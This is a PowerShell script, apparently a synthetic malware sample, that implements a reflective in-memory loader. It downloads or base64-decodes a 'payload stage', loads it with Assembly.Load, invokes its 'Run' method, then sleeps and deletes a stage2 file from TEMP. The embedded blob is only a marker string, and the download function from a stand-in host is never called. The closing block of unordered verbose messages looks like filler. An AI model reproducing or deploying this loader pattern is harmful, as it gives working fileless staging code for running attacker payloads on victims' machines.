<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://contoso.com:80/payload.bin',
    [string]$ActivityLog = "$env:TEMP\report.txt",
    [int]$TimeoutSec = 168
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 168
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo5c3RqdGdvNmIx')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($AssemblyBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $ResultObject
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $AssemblyBytes.Length
    Endpoint = $DownloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Start-Sleep -Seconds 15
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$StageMarker = "stage-32"
